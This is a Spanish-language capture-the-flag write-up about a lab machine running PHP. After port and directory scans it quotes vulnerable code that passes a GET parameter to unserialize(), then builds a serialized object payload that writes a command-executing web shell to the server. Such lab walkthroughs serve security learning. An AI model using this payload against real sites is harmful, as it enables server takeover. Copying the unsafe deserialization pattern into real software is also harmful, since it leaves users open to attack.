### Tags: `PHP` `deseralation` `motd`

# Escaneo (*22, 80*)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn <IP> -oN escaneo
```

![image](https://github.com/user-attachments/assets/6807af1d-d607-4c41-a853-05012d700cf5)


# Port 80 **/** gobuster

Como vimos es un web de **apache por defecto** y por ende vamos a tirar un **Gobuster** para descubrir directorios

```ruby
gobuster dir -q -u http://10.10.225.96 -w /usr/share/wordlists/dirb/common.txt   
```

Encontramos un `/backup` y un `index.php`

![image](https://github.com/user-attachments/assets/5ca68162-e2c3-41f4-964e-e0491c9f9f22)

El `index.php` tiene esto:

![image](https://github.com/user-attachments/assets/3f770d4f-1b82-4f04-b745-8c2c91f4c278)

En el `/backup` nos descargamos este archivo a nuestra maquina

![image](https://github.com/user-attachments/assets/3b1e038f-721d-4a75-9977-b4272a6567f6)

Vemos que tenemos una pista en este mensaje de este codigo

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

        $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>
```

El código PHP toma el nombre, el correo electrónico y el comentario que se pasan en el GET mediante un formulario en la página. Utiliza esos valores para crear un mensaje que se escribe en el archivo `message.txt`cuando se destruye el objeto y podemos simplemente ingresar un `$_GET['debug']`parámetro de depuración con la entrada serializada y el código fuente lo deserializará.

![image](https://github.com/user-attachments/assets/b74e76db-6d2b-407e-9813-caa50984d355)

Lo que hacemos ahora es crearnos este **archivo.php**

```php
<?php
class FormSubmit{
        public $form_file = 'pawned.php';
        public $message = '<?php system($_GET["cmd"]); ?>';
}
$obj = new FormSubmit();
echo serialize($obj);
?>
```

Ahora lo probamos y nos da el ``objeto serializado`` ---> comando: `php <nombre_del_archivo>`

```php
O:10:"FormSubmit":2:{s:9:"form_file";s:10:"pawned.php";s:7:"message";s:30:"<?php system($_GET["cmd"]); ?>";}
```

- - `O`  significa objeto
- `O:10`  significa la longitud del nombre del objeto (es decir, ---> 10)
- `2:{`  significa que hay dos propiedades/atributos
- `s:9`  significa que nuestra propiedad/atributo es una cadena y tiene una longitud de 9 caracteres
- `s:9:"form_file";`  Longitud de 9 y nombre de la propiedad

















